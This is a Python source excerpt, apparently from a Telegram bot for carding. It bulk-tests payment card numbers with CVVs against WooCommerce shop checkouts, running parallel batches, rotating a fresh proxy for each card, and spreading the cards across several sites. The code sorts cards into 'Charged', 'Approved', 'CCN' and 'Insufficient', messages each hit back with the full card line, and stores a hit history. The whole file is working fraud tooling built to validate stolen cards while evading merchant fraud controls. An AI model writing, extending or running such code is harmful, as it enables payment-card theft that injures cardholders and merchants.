async def process_single_woo_card(card_line, proxy_data, use_proxy, card_num, total_cards, site_url=None):
    """Process a single WooCommerce card"""
    cc = None
    try:
        if '/' in card_line and '|' not in card_line:
            parts = card_line.split('/')
        else:
            parts = card_line.split('|')
        
        if len(parts) < 4:
            return (card_line, ("Error", "Invalid format", card_line[:20]), proxy_data)
        
        cc, mes, ano, cvv = parts[:4]
        cc = ''.join(c for c in cc if c.isdigit())
        mes = ''.join(c for c in mes if c.isdigit()).zfill(2)[:2]
        ano = ''.join(c for c in ano if c.isdigit())[-2:]
        cvv = ''.join(c for c in cvv if c.isdigit())[:4]
        
        if not cc or not cvv or len(cc) < 13:
            return (card_line, ("Error", "Invalid card", card_line[:20]), proxy_data)
        
        masked_cc = f"{cc[:6]}******{cc[-4:]}"
        
        proxy_info = ""
        if proxy_data and use_proxy:
            proxy_info = f" via {proxy_data.get('host', '?')}"
        log(f"[WOO-CHECK] ⚡ Card {card_num}/{total_cards}: {masked_cc}{proxy_info}", "INFO")
        
        proxy_url = None
        http_proxy = None
        proxy_auth = None
        
        if use_proxy and proxy_data:
            proxy_url = get_proxy_url(proxy_data)
            if proxy_url and not proxy_url.startswith("socks"):
                http_proxy = get_simple_proxy_url(proxy_data)
                proxy_auth = get_proxy_auth(proxy_data)
        
        gate = WooCommerceGateRotator(proxy_url=proxy_url, http_proxy=http_proxy, proxy_auth=proxy_auth)
        result = await gate.process_card(cc, mes, ano, cvv, site_url=site_url)
        
        return (card_line, result, proxy_data)
        
    except Exception as e:
        log(f"[WOO] ❌ Card failed: {str(e)[:50]}", "ERROR")
        masked = f"{cc[:6]}******{cc[-4:]}" if cc and len(cc) >= 10 else "unknown"
        return (card_line, ("Error", str(e)[:50], masked), proxy_data)


async def send_result_to_user(chat_id, result_type, card_line, reason, masked_cc, gateway="WooCommerce", amount=None):
    """Send premium styled result to user with receipt details for charged cards"""
    # Telegram Markdown is strict: unpaired '_' '*' etc can break message sending.
    # Put dynamic fields into code formatting to avoid parse errors (e.g. "SUCCESS_$5").
    def _md_code(text):
        return str(text or "").replace("`", "'")

    msg = ""
    if result_type == "Charged":
        # Parse receipt details from reason (format: "SUCCESS | $5.00 USD | ****1234 | Order:abc123")
        receipt_parts = {}
        if reason and " | " in reason:
            parts = reason.split(" | ")
            for part in parts:
                if part.startswith("$"):
                    receipt_parts['charged_amount'] = part
                elif part.startswith("****"):
                    receipt_parts['last4'] = part
                elif part.startswith("Order:"):
                    receipt_parts['order_id'] = part.replace("Order:", "")
        
        # Build enhanced message with receipt proof
        msg = f"""
◈ {bold_sans("💰 CHARGED")} 💰
{'─'*20}

► `{card_line}`

{bold_serif("Gateway")}: `{_md_code(gateway)}`"""
        
        if amount:
            msg += f"""
{bold_serif("Product Amount")}: `{_md_code(amount)}`"""
        
        # Add receipt proof details
        if receipt_parts.get('charged_amount'):
            msg += f"""
{bold_serif("💵 Charged")}: `{_md_code(receipt_parts['charged_amount'])}`"""
        
        if receipt_parts.get('last4'):
            msg += f"""
{bold_serif("💳 Card")}: `{_md_code(receipt_parts['last4'])}`"""
        
        if receipt_parts.get('order_id'):
            msg += f"""
{bold_serif("🧾 Order ID")}: `{_md_code(receipt_parts['order_id'])}`"""
        
        # Always show full reason for transparency
        msg += f"""

{bold_serif("Receipt")}: `{_md_code(reason)}`
"""
    elif result_type == "Approved":
        msg = f"""
◈ {bold_sans("APPROVED")}
{'─'*20}

► `{card_line}`

{bold_serif("Result")}: `{_md_code(reason)}`
{bold_serif("Gateway")}: `{_md_code(gateway)}`
"""
    elif result_type == "CCN":
        msg = f"""
◈ {bold_sans("CCN")}
{'─'*20}

► `{card_line}`

{bold_serif("Result")}: `{_md_code(reason)}`
{bold_serif("Gateway")}: `{_md_code(gateway)}`
"""
    elif result_type == "Insufficient":
        msg = f"""
◈ {bold_sans("INSUFFICIENT")}
{'─'*20}

► `{card_line}`

{bold_serif("Result")}: `{_md_code(reason)}`
{bold_serif("Gateway")}: `{_md_code(gateway)}`
"""
    elif result_type == "Declined":
        return
    else:
        return
        
    if msg:
        await safe_send_message(chat_id, msg, parse_mode='Markdown')


async def process_user_woo_cards(user_id, chat_id):
    """Process cards for a specific user using their own proxies - WOOCOMMERCE"""
    global user_woo_processing, user_woo_stats
    
    cards = await get_user_cards(user_id)
    proxies = await get_user_proxies(user_id)
    sites = await get_user_woo_sites(user_id)
    
    if not cards:
        await safe_send_message(chat_id, "❌ No cards in your queue!")
        user_woo_processing[user_id]["active"] = False
        return
    
    if not proxies and user_id != OWNER_ID:
        await safe_send_message(chat_id, "❌ No proxies configured! Use /addproxy first.")
        user_woo_processing[user_id]["active"] = False
        return
    
    use_proxy = len(proxies) > 0
    
    if user_id not in user_woo_stats:
        user_woo_stats[user_id] = {"total": 0, "charged": 0, "approved": 0, "ccn": 0, "insufficient": 0, "declined": 0, "errors": 0}
    
    stats = user_woo_stats[user_id]
    proxy_msg = f"{len(proxies)} proxies" if use_proxy else "NO PROXY (Owner mode)"
    log(f"[WOO] Starting for user {user_id}: {len(cards)} cards, {len(sites)} sites, with {len(proxies)} proxies", "INFO")
    
    batch_size = 10 # Fixed batch size for now
    
    counter = LiveCounter(len(cards), chat_id, "WooCommerce Gateway")
    await counter.update(force=True)
    
    await safe_send_message(chat_id, f"💳 *WooCommerce Check Started*\n⚡ Parallel Mode: {batch_size} cards\n• Cards: {len(cards)}\n• Sites: {len(sites)}", parse_mode='Markdown')
    
    # Process in batches
    for i in range(0, len(cards), batch_size):
        if not user_woo_processing.get(user_id, {}).get("active", False):
            await safe_send_message(chat_id, "🛑 WooCommerce processing stopped by user.")
            break
            
        batch = cards[i:i+batch_size]
        log(f"╔{'═'*63}╗", "INFO")
        log(f"║  ⚡ WOO BATCH {i//batch_size + 1}/{(len(cards)+batch_size-1)//batch_size}: Processing {len(batch)} cards in parallel", "INFO")
        log(f"╚{'═'*63}╝", "INFO")
        
        tasks = []
        # Expand proxies for rotating proxy support (only if rotating mode enabled)
        batch_proxies = expand_rotating_proxies(proxies, min_pool_size=len(batch), user_id=user_id) if proxies else []
        
        for j, card_line in enumerate(batch):
            # Each card gets own proxy connection (fresh IP for rotating proxies)
            proxy_data = batch_proxies[j] if j < len(batch_proxies) else None
            
            # Assign site round-robin
            site = sites[(i + j) % len(sites)]
            
            task = process_single_woo_card(
                card_line, 
                proxy_data, 
                use_proxy,
                i + j + 1,
                len(cards),
                site_url=site['url']
            )
            tasks.append(task)
            
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for res in results:
            stats["total"] += 1
            counter.processed += 1
            
            if isinstance(res, Exception):
                stats["errors"] += 1
                counter.errors += 1
                continue
                
            if isinstance(res, tuple) and len(res) == 3:
                card_line, result, _ = res
                result_type, reason, masked_cc = result
                
                result_str = f"{card_line} => {result_type}: {reason}"
                
                if result_type == "Charged":
                    stats["charged"] += 1
                    counter.live += 1
                    await save_user_result(user_id, "woo_charged", result_str)
                    await send_result_to_user(chat_id, "Charged", card_line, reason, masked_cc, gateway="WooCommerce")
                    await append_to_hit_history(user_id, card_line, "CHARGED", "woocommerce", source_chat_id=chat_id)
                elif result_type == "Approved":
                    stats["approved"] += 1
                    counter.live += 1
                    await save_user_result(user_id, "woo_approved", result_str)
                    await send_result_to_user(chat_id, "Approved", card_line, reason, masked_cc, gateway="WooCommerce")
                    await append_to_hit_history(user_id, card_line, "APPROVED", "woocommerce", source_chat_id=chat_id)
                elif result_type == "Declined":
                    stats["declined"] += 1
                    counter.declined += 1
                else:
                    stats["errors"] += 1
                    counter.errors += 1
        
        await counter.update()
        await asyncio.sleep(1)

    user_woo_processing[user_id]["active"] = False
    await safe_send_message(chat_id, "✅ WooCommerce check completed.")


